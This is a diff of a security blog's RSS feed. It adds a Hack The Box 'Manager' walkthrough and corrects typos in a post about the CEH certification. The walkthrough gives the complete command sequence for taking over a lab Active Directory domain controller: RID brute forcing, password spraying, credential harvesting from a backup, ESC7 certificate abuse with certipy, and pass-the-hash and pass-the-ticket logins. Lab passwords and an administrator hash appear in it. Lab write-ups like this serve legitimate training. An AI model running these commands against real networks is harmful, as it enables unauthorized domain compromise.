@@ -6,8 +6,279 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Sat, 02 Mar 2024 11:10:54 -0600</lastBuildDate>
+        <lastBuildDate>Fri, 15 Mar 2024 22:14:37 -0500</lastBuildDate>
         <atom:link href="https://scorpiosec.com/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>HTB: Manager</title>
+            <link>https://scorpiosec.com/posts/2024/03/htb-manager/</link>
+            <pubDate>Fri, 15 Mar 2024 22:14:37 -0500</pubDate>
+            
+            <guid>https://scorpiosec.com/posts/2024/03/htb-manager/</guid>
+            <description>Platform: Hack The Box Link: Manager Level: Medium OS: Windows Manager is featuring a Windows server 2019 running Active Directory and a MSSQL database in addtion to various other services. The target is vulnerable to RID brute forcing and ESC7 (Vulnerable Certificate Authority Access Control).
+The target IP address is 10.10.11.236
+Scanning I first check all the open ports.
+nmap 10.10.11.236 -p- -T4 -Pn --open Starting Nmap 7.94SVN ( https://nmap.</description>
+            <content type="html"><![CDATA[<ul>
+<li>Platform: Hack The Box</li>
+<li>Link: <a href="https://app.hackthebox.com/machines/Manager" target="_blank" >Manager</a>
+
+</li>
+<li>Level: Medium</li>
+<li>OS: Windows</li>
+</ul>
+<hr>
+<p>Manager is featuring a Windows server 2019 running Active Directory and a MSSQL database in addtion to various other services. The target is vulnerable to RID brute forcing and ESC7 (Vulnerable Certificate Authority Access Control).</p>
+<p>The target IP address is <code>10.10.11.236</code></p>
+<h2 id="scanning">Scanning</h2>
+<p>I first check all the open ports.</p>
+<pre tabindex="0"><code>nmap 10.10.11.236 -p- -T4 -Pn --open
+</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-03-13 13:38 CDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.236
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.048s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65514</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE
+</span></span><span style="display:flex;"><span>53/tcp    open  domain
+</span></span><span style="display:flex;"><span>80/tcp    open  http
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5
+</span></span><span style="display:flex;"><span>593/tcp   open  http-rpc-epmap
+</span></span><span style="display:flex;"><span>636/tcp   open  ldapssl
+</span></span><span style="display:flex;"><span>1433/tcp  open  ms-sql-s
+</span></span><span style="display:flex;"><span>3268/tcp  open  globalcatLDAP
+</span></span><span style="display:flex;"><span>3269/tcp  open  globalcatLDAPssl
+</span></span><span style="display:flex;"><span>5985/tcp  open  wsman
+</span></span><span style="display:flex;"><span>9389/tcp  open  adws
+</span></span><span style="display:flex;"><span>49667/tcp open  unknown
+</span></span><span style="display:flex;"><span>49669/tcp open  unknown
+</span></span><span style="display:flex;"><span>49671/tcp open  unknown
+</span></span><span style="display:flex;"><span>49727/tcp open  unknown
+</span></span><span style="display:flex;"><span>57702/tcp open  unknown
+</span></span><span style="display:flex;"><span>58902/tcp open  unknown
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 107.12 seconds
+</span></span></code></pre></div><p>And I run another scan to get more information about services and their versions.</p>
+<pre tabindex="0"><code>nmap -sC -sV --open 10.10.11.236
+</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-03-13 13:46 CDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.236
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.048s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">987</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>53/tcp   open  domain        Simple DNS Plus
+</span></span><span style="display:flex;"><span>80/tcp   open  http          Microsoft IIS httpd 10.0
+</span></span><span style="display:flex;"><span>|_http-title: Manager
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
+</span></span><span style="display:flex;"><span>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2024-03-14 01:45:32Z<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>135/tcp  open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: manager.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssl-date: 2024-03-14T01:46:56+00:00; +6h58m40s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>dc01.manager.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2023-07-30T13:51:28
+</span></span><span style="display:flex;"><span>|_Not valid after:  2024-07-29T13:51:28
+</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds?
+</span></span><span style="display:flex;"><span>464/tcp  open  kpasswd5?
+</span></span><span style="display:flex;"><span>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: manager.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssl-date: 2024-03-14T01:46:56+00:00; +6h58m41s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>dc01.manager.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2023-07-30T13:51:28
+</span></span><span style="display:flex;"><span>|_Not valid after:  2024-07-29T13:51:28
+</span></span><span style="display:flex;"><span>1433/tcp open  ms-sql-s      Microsoft SQL Server <span style="color:#ae81ff">2019</span> 15.00.2000.00; RTM
+</span></span><span style="display:flex;"><span>|_ssl-date: 2024-03-14T01:46:56+00:00; +6h58m40s from scanner time.
+</span></span><span style="display:flex;"><span>| ms-sql-ntlm-info: 
+</span></span><span style="display:flex;"><span>|   10.10.11.236:1433: 
+</span></span><span style="display:flex;"><span>|     Target_Name: MANAGER
+</span></span><span style="display:flex;"><span>|     NetBIOS_Domain_Name: MANAGER
+</span></span><span style="display:flex;"><span>|     NetBIOS_Computer_Name: DC01
+</span></span><span style="display:flex;"><span>|     DNS_Domain_Name: manager.htb
+</span></span><span style="display:flex;"><span>|     DNS_Computer_Name: dc01.manager.htb
+</span></span><span style="display:flex;"><span>|     DNS_Tree_Name: manager.htb
+</span></span><span style="display:flex;"><span>|_    Product_Version: 10.0.17763
+</span></span><span style="display:flex;"><span>| ms-sql-info: 
+</span></span><span style="display:flex;"><span>|   10.10.11.236:1433: 
+</span></span><span style="display:flex;"><span>|     Version: 
+</span></span><span style="display:flex;"><span>|       name: Microsoft SQL Server <span style="color:#ae81ff">2019</span> RTM
+</span></span><span style="display:flex;"><span>|       number: 15.00.2000.00
+</span></span><span style="display:flex;"><span>|       Product: Microsoft SQL Server <span style="color:#ae81ff">2019</span>
+</span></span><span style="display:flex;"><span>|       Service pack level: RTM
+</span></span><span style="display:flex;"><span>|       Post-SP patches applied: false
+</span></span><span style="display:flex;"><span>|_    TCP port: <span style="color:#ae81ff">1433</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>SSL_Self_Signed_Fallback
+</span></span><span style="display:flex;"><span>| Not valid before: 2024-03-06T12:01:23
+</span></span><span style="display:flex;"><span>|_Not valid after:  2054-03-06T12:01:23
+</span></span><span style="display:flex;"><span>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: manager.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>dc01.manager.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2023-07-30T13:51:28
+</span></span><span style="display:flex;"><span>|_Not valid after:  2024-07-29T13:51:28
+</span></span><span style="display:flex;"><span>|_ssl-date: 2024-03-14T01:46:56+00:00; +6h58m40s from scanner time.
+</span></span><span style="display:flex;"><span>3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: manager.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>dc01.manager.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2023-07-30T13:51:28
+</span></span><span style="display:flex;"><span>|_Not valid after:  2024-07-29T13:51:28
+</span></span><span style="display:flex;"><span>|_ssl-date: 2024-03-14T01:46:56+00:00; +6h58m41s from scanner time.
+</span></span><span style="display:flex;"><span>Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2024-03-14T01:46:19
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: 6h58m40s, deviation: 0s, median: 6h58m39s
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   3:1:1: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 95.25 seconds
+</span></span></code></pre></div><p>Many services are running on this machine, I notice the domain controller <code>manager.htb</code> and I add it to the <code>/etc/hosts</code> file.</p>
+<pre tabindex="0"><code>sudo echo &#34;10.10.11.236 manager.htb&#34; | sudo tee -a /etc/hosts
+</code></pre><h2 id="enumeration">Enumeration</h2>
+<p>The website does not provide anything valuable, it is a basic static website with no working functionalities.</p>
+<p><img src="/images/HTB-Manager/website.png" alt="Manager-Website"></p>
+<p>Gobuster does not provide anything valuable either.</p>
+<p>I then try to enumerate SMB. I can access it as a guest but there is nothing of interest here.</p>
+<pre tabindex="0"><code>smbmap -H 10.10.11.236 -u guest
+</code></pre><p><img src="/images/HTB-Manager/smb-guest.png" alt="SMB-guest-login"></p>
+<p>I know that Active Directory is running on the target so I attempt RID brute forcing.</p>
+<blockquote>
+<p>RID stands for Relative Identifier. It is a unique identifier assigned to each security principal (such as users, groups, and computers) within a Windows domain. RID brute forcing, also known as RID cycling or RID enumeration, is a technique used by attackers to identify valid user accounts within a Windows domain by guessing or cycling through RID values.</p>
+</blockquote>
+<pre tabindex="0"><code>crackmapexec smb manager.htb -u guest -p &#39;&#39; --rid-brute
+</code></pre><p><img src="/images/HTB-Manager/rid-bruteforcing.png" alt="RID-Brute-forcing"></p>
+<p>I only want the lines with the usernames so I copy them into a file (start from user <code>Zhong</code>).</p>
+<p><img src="/images/HTB-Manager/smb-list.png" alt="Users-from-RID-brute-forcing"></p>
+<p>I extract the usernames from it and I send the output to another file.</p>
+<pre tabindex="0"><code>awk -F&#39;: &#39; &#39;{split($NF, a, &#34;\\&#34;); split(a[2], b, &#34; &#34;); print tolower(b[1])}&#39; smb-output.txt &gt; smb-users.txt
+</code></pre><p><img src="/images/HTB-Manager/smb-users.png" alt="Domain-users-list"></p>
+<p>Now I test if some users have their passwords as their username.</p>
+<pre tabindex="0"><code>crackmapexec smb manager.htb -u $(cat ~/Machines/HTB/Manager/smb-users.txt) -p $(cat ~/Machines/HTB/Manager/smb-users.txt) --continue-on-success
+</code></pre><p>The pair <code>operator:operator</code> is successful!</p>
+<p><img src="/images/HTB-Manager/smb-login.png" alt="SMB-login-credentials"></p>
+<p>There are no shares accessible with this user so I turned my attention to the MSSQL database.</p>
+<pre tabindex="0"><code>crackmapexec mssql manager.htb -u operator -p operator
+</code></pre><p>Turns out I can access the database with those same smb credentials.</p>
+<p><img src="/images/HTB-Manager/MSSQL-login.png" alt="MSSQL-login-credentials"></p>
+<pre tabindex="0"><code>impacket-mssqlclient operator:operator@dc01.manager.htb -windows-auth
+</code></pre><p><img src="/images/HTB-Manager/MSSQL-ACCESS.png" alt="MSSQL-database-accessed"></p>
+<p>I try enabling <code>xp_cmdshell</code> but it fails.</p>
+<blockquote>
+<p><code>xp_cmdshell</code> is a system stored procedure in Microsoft SQL Server that allows users to execute operating system commands directly from within SQL Server. It is a powerful feature that provides a way to interact with the underlying operating system from within the SQL Server environment.</p>
+</blockquote>
+<p><img src="/images/HTB-Manager/xp-cmdshell.png" alt="xp-cmdshell-failure"></p>
+<p>I list the directories with <code>xp_dirtree</code>, Microsoft IIS web root is found at <code>C:\inetpub\wwwroot</code>.</p>
+<pre tabindex="0"><code>xp_dirtree C:\inetpub\wwwroot
+</code></pre><p><img src="/images/HTB-Manager/xp_dirtree.png" alt="MSSQL-database-accessed"></p>
+<p>I see a backup file called <code>website-backup-27-07-23-old.zip</code> that I download with <code>wget http://manager.htb/website-backup-27-07-23-old.zip -O backup.zip</code>.</p>
+<p>After unziping the archive I notice a hidden file called <code>.old-conf.xml</code>.</p>
+<p><img src="/images/HTB-Manager/xml-file.png" alt="old-conf-xml-file"></p>
+<p>It contains credentials for the user <code>raven</code>.</p>
+<p><img src="/images/HTB-Manager/raven-user-credentials.png" alt="raven-user-credentials"></p>
+<h2 id="foothold">Foothold</h2>
+<blockquote>
+<p>From the nmap results I know that port <code>5985</code> was open, which is typically used for <code>WinRM (Windows Remote Management)</code> service.</p>
+</blockquote>
+<p>These credentials allow me to get a foothold on the target.</p>
+<pre tabindex="0"><code>evil-winrm -u raven -p &#39;R4v3nBe5tD3veloP3r!123&#39; -i manager.htb
+</code></pre><p><img src="/images/HTB-Manager/foothold.png" alt="Foothold-via-evil-WinRM"></p>
+<h3 id="user-flag">user flag</h3>
+<p>The user flag <code>user.txt</code> is at <code>C:\Users\Raven\Desktop\user.txt</code>.</p>
+<p><img src="/images/HTB-Manager/user-flag.png" alt="Foothold-via-evil-WinRM"></p>
+<p>I get more information about the system just in case I need to look for some vulnerabilities specific to the OS version. I do so with <code>get-computerinfo</code>.</p>
+<p><img src="/images/HTB-Manager/computerinfo.png" alt="Target-system-info"></p>
+<p>Knowing that I am in an Active Directory environment I check the access rights of the users with <code>certify</code>, the executable is available <a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries" target="_blank" >here</a>
+
+.</p>
+<p><img src="/images/HTB-Manager/CA-rights.png" alt="Principal-rights-enumeration"></p>
+<p>The user <code>raven</code> has the the rights to manage the Certificate Authority and to request and enroll certificates from the Certificate Authority.</p>
+<p>The CA used is <code>manager-DC01-CA</code>.</p>
+<p><img src="/images/HTB-Manager/certutil.png" alt="Certificate-Authority-information"></p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>The certificate vulnerability (ESC7) exploitation is explained in details <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#attack-2" target="_blank" >here</a>
+
+.</p>
+<blockquote>
+<p>&ldquo;The technique relies on the fact that users with the <code>Manage CA</code> and <code>Manage Certificates</code> access right can issue failed certificate requests. The <code>SubCA</code>
+certificate template is vulnerable to ESC1, but only administrators can enroll in the template. Thus, a user can request to enroll in the <code>SubCA</code> - which will be denied - but then issued by the manager afterwards.&rdquo;</p>
+</blockquote>
+<ol>
+<li>You grant yourself the <code>Manage Certificates</code> access right by adding the user as a new officer.</li>
+</ol>
+<pre tabindex="0"><code>certipy ca -ca &#39;manager-DC01-CA&#39; -username raven@manager.htb -password &#39;R4v3nBe5tD3veloP3r!123&#39; -dc-ip 10.10.11.236 -add-officer raven
+</code></pre><p><img src="/images/HTB-Manager/CA1.png" alt="Add-officer-Raven"></p>
+<ol start="2">
+<li>The <code>SubCA</code> template can be <strong>enabled on the CA</strong> with the <code>-enable-template</code> parameter.</li>
+</ol>
+<pre tabindex="0"><code>certipy ca -username raven@manager.htb -password &#39;R4v3nBe5tD3veloP3r!123&#39; -dc-ip 10.10.11.236 -ca &#39;manager-DC01-CA&#39; -enable-template &#39;SubCA&#39;
+</code></pre><p><img src="/images/HTB-Manager/CA2.png" alt="Enable-SubCA"></p>
+<ol start="3">
+<li>We start by requesting a certificate based on the SubCA template. This request will be denied, but we will save the private key and note down the request ID. make sure you are running the command from a directory where you have writing rights, otherwise the <code>.key</code> will not be written.</li>
+</ol>
+<pre tabindex="0"><code>certipy req -ca &#39;manager-DC01-CA&#39; -username raven@manager.htb -password &#39;R4v3nBe5tD3veloP3r!123&#39; -dc-ip 10.10.11.236 -template SubCA -upn administrator@manager.htb
+</code></pre><p><img src="/images/HTB-Manager/CA3.png" alt="Certificate-private-key"></p>
+<ol start="4">
+<li>With the <code>Request ID</code>, issue a certificate. You do so with <code>-issue-request &lt;request ID&gt;</code></li>
+</ol>
+<pre tabindex="0"><code>certipy ca -ca &#39;manager-DC01-CA&#39; -issue-request 24 -username raven@manager.htb -password &#39;R4v3nBe5tD3veloP3r!123&#39; -dc-ip 10.10.11.236
+</code></pre><p><img src="/images/HTB-Manager/CA4.png" alt="Certificate-issued-successfully"></p>
+<ol start="5">
+<li>Retrieve the issued certificate with the <code>req</code> command and the <code>-retrieve &lt;request ID&gt;</code> parameter.</li>
+</ol>
+<pre tabindex="0"><code>certipy req -username raven@manager.htb -password &#39;R4v3nBe5tD3veloP3r!123&#39; -ca manager-DC01-CA -target manager.htb -retrieve 24 -dc-ip 10.10.11.236
+</code></pre><p><img src="/images/HTB-Manager/CA5.png" alt="Certificate-retrieved"></p>
+<ol start="6">
+<li>The execution of the next commands will require clock synchronization with the DC. In order for this to work, we can use <code>ntpdate</code>.</li>
+</ol>
+<blockquote>
+<p>This step is very time sensitive, you need to run these commands quickly. If you aren&rsquo;t able to make it work, I recommend chaining the commands together after running <code>sudo ntpdate -u manager.htb</code>.</p>
+</blockquote>
+<p>Failing to execute the commands fast enough will lead to this error.</p>
+<p><img src="/images/HTB-Manager/Clock-error.png" alt="Clock-skew-error"></p>
+<p>Run the command below and quickly execute the second command with <code>certipy auth</code>.</p>
+<pre tabindex="0"><code>sudo ntpdate -u manager.htb
+</code></pre><p><img src="/images/HTB-Manager/CLOCK-SYNC.png" alt="ntpdate-clock-sync"></p>
+<pre tabindex="0"><code>certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236
+</code></pre><p>We get a TGT ticket and the administrator hash. Both can be used to get administrative privileges. You can login with the hash using <code>evil-winrm</code> or you can pass the ticket with <code>impacket</code>.</p>
+<p><img src="/images/HTB-Manager/CA6.png" alt="TGT-Ticket-and-admin-hash"></p>
+<h3 id="evil-winrm-method">evil-winrm method</h3>
+<pre tabindex="0"><code>evil-winrm -i 10.10.11.236 -u administrator -H ae5064c2f62317332c88629e025924ef
+</code></pre><p><img src="/images/HTB-Manager/evil-winrm-root.png" alt="admin-shell-evil-WinRM"></p>
+<h3 id="pass-the-ticket-method">Pass the ticket method</h3>
+<blockquote>
+<p>This method is subject to <code>Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</code> so you will need to to reuse the <code>ntpdate</code> command again before using <code>impacket</code>.</p>
+</blockquote>
+<p>To pass the ticket I first need to export it. You can read more about it <a href="https://www.thehacker.recipes/a-d/movement/kerberos/pass-the-certificate" target="_blank" >here</a>
+
+.</p>
+<pre tabindex="0"><code>export KRB5CCNAME=administrator.ccache
+</code></pre><p>Then I login to the DC</p>
+<pre tabindex="0"><code>python3 /usr/share/doc/python3-impacket/examples/psexec.py manager.htb/administrator@dc01 -k -no-pass -dc-ip 10.10.11.236 -target-ip 10.10.11.236
+</code></pre><p>And we are in with a privileged account!</p>
+<p><img src="/images/HTB-Manager/CA7.png" alt="Impacket-privileged-account"></p>
+<h3 id="chained-commands-method">Chained commands method</h3>
+<p>Chaining the commands might be the solution for you if you are unable to run them fast enough individually. Still you will probably need to try multiple times, just remember to be fast.</p>
+<pre tabindex="0"><code>sudo ntpdate -u manager.htb
+</code></pre><pre tabindex="0"><code>certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236 &amp;&amp; export KRB5CCNAME=administrator.ccache &amp;&amp; python3 /usr/share/doc/python3-impacket/examples/psexec.py manager.htb/administrator@dc01 -k -no-pass -dc-ip 10.10.11.236 -target-ip 10.10.11.236
+</code></pre><p><img src="/images/HTB-Manager/CA-chain-cmds.png" alt="ESC7-with-chained-commands"></p>
+<h2 id="root-flag">Root flag</h2>
+<p>The root flag <code>root.txt</code> is at <code>c:\Users\Administrator\Desktop</code></p>
+<p><img src="/images/HTB-Manager/root-flag.png" alt="root-flag"></p>
+<p>This is all for this challenge, I hope this writeup for helpful! Stay tuned for more and feel free to reach me out on X at <a href="https://twitter.com/_KScorpio" target="_blank" >@_KScorpio</a>
+
+.</p>
+]]></content>
+        </item>
         
         <item>
             <title>HTB: CozyHosting</title>
@@ -1122,8 +1393,8 @@ Before capturing an image for deployment, you often use the System Preparation (
 <p><img src="/images/CEH-jobs.png" alt="CEH job postings on LinkedIn">
 <em>8,941 jobs listing CEH at the time of writing on LinkedIn</em></p>
 <h2 id="the-controversy-multiple-choice-and-its-critics">The Controversy: Multiple Choice and its Critics</h2>
-<p>I am sure you have seen it online (YouTube, Reddit, etc.), statetements like &ldquo;The CEH won&rsquo;t teach you anything&rdquo;, &ldquo;CEH is useless!&rdquo; and so on. Critics argue that because hacking is a dynamic field requiring hands-on knowledge traditional exam methods are ineffective. While I agree with the sentiment I also think that we should scrutinize this stance. First, I believe that the CEH does not replicate the hands-on nature of hacking but I agree that it serves its purpose which is to be a standardized measure to evaluate foundational theorical knowledge, ensuring a common baseline for ethical hacking professionals.</p>
-<p>So let&rsquo;s me be honest here, the CEH <strong>did</strong> teach me a lot of things especially as a beginner. Most people &ldquo;memorize&rdquo; the material just to pass the exam and act surprised that they didn&rsquo;t retain anything after. During my preparation I &ldquo;studied&rdquo; and came out with some solid knowledge, I supplemented the theoretical knowledge with some labs to deepen my understanding of the concepts.</p>
+<p>I am sure you have seen it online (YouTube, Reddit, etc.), statements like &ldquo;The CEH won&rsquo;t teach you anything&rdquo;, &ldquo;CEH is useless!&rdquo; and so on. Critics argue that because hacking is a dynamic field requiring hands-on knowledge traditional exam methods are ineffective. While I agree with the sentiment I also think that we should scrutinize this stance. First, I believe that the CEH does not replicate the hands-on nature of hacking but I agree that it serves its purpose which is to be a standardized measure to evaluate foundational theorical knowledge, ensuring a common baseline for ethical hacking professionals.</p>
+<p>So let me be honest here, the CEH <strong>did</strong> teach me a lot of things especially as a beginner. Most people &ldquo;memorize&rdquo; the material just to pass the exam and act surprised that they didn&rsquo;t retain anything after. During my preparation I &ldquo;studied&rdquo; and came out with some solid knowledge, I supplemented the theoretical knowledge with some labs to deepen my understanding of the concepts.</p>
 <p>My second point might be biased but hear me out. Apparently HR departments love the CEH, it is listed on most security jobs. I am convinced that finding a job in cybersecurity today is a number game, so you have to work on two fronts which are: how you appear to potential employers and your actual technical skills. Especially, if you are a self-taught cybersecurity individual you need to put as many chances on your side as possible. Nothing is preventing you from getting the CEH as an HR checking certification and actually developing deep technical skills.</p>
 <p>My final point on this whole CEH thing is simple. Get it if you are <strong>not</strong> paying for it (as it costs $950-$1,199). You will learn if you actually apply yourself and it will serve its HR bypass function.</p>
 <h2 id="overview-of-the-ceh-exam">Overview of the CEH exam</h2>
@@ -1143,7 +1414,7 @@ Before capturing an image for deployment, you often use the System Preparation (
 </li>
 </ul>
 <h2 id="conclusion">Conclusion</h2>
-<p>While I acknowledge that the criticism about the CEH is valid, I think it does provide some value by helping you with HR and teaching about a lot of topics related to ethical hacking and you should go for it if you are getting sponsored. I encourage you to have a balanced view of certifications, and make informed decisions based on your career goals and personal situation. At the end of the day, you know what is best for you. I also recommend complementing that CEH with hands-on experience by doing labs.</p>
+<p>While I acknowledge that the criticism about the CEH is valid, I think it does provide some value by helping you with HR and teaching about a lot of topics related to ethical hacking. You should go for it if you are getting sponsored. I encourage you to have a balanced view of certifications, and make informed decisions based on your career goals and personal situation. At the end of the day, you know what is best for you. I also recommend complementing that CEH with hands-on experience by doing labs.</p>
 ]]></content>
         </item>
         
